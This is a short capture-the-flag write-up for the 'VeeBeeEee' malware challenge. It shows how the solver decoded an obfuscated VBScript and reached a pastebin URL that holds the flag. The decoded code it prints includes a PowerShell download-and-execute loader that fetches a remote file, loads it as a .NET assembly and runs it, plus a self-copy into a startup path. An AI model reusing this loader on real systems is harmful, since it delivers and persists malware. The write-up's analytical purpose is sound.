# VeeBeeEee (malware, 764 solves, 50 points)

## Introduction

<p align="left">
  <img height=400 img src=./readme_assets/vb-challenge.PNG/>
</p>

## Solution

The file has no extension. Opened in mousepad and see the file is partially `UTF-8` and partially `ANSI_X3.4-1986`.

<p align="left">
  <img height=300 img src=./readme_assets/vb-text.PNG/>
</p>

I used [Cyberchef](https://gchq.github.io/CyberChef/) to decode the text using `Microsoft Script Decoder`.

<p align="left">
  <img height=400 img src=./readme_assets/vb-decode.PNG/>
</p>

Remove all of the excess stuff from the file and it looks like normal code. Follow the logic of the code and you get:

```
powershell $f='C:\Users\Public\Documents\July.htm';

if (!(Test-Path $f)){Invoke-WebRequest https://pastebin.com/raw/SiYGwwcz' -outfile $f  };

PathString = SObject.NameSpace(7).Self.Path  "/"  WScript.ScriptName
[System.Reflection.Assembly]::loadfile($f);
[WorkArea.Work]::Exe()

Sub CollectThenReplace(First, Second , Third , Fourth , Fifth)
Temp = First + Second + Third + Fourth + Fifth
Code = Replace(Temp , "" , "" )
End Sub

Return = Object.Run(Code, 0, true)

WScript.Sleep(50000)
For i = 1 To 5
if i = 5 Then
Paste(SPath)
End if
Next
Sub Paste(RT)
FObject.CopyFile RT,PathString
End Sub
```
Paste the url `https://pastebin.com/raw/SiYGwwcz'` from the code into a browser to get the flag.

## Flag

**`flag{ed81d24958127a2adccfb343012cebff}`**

## Tools

- `mousepad`
- [Cyberchef](https://gchq.github.io/CyberChef/)
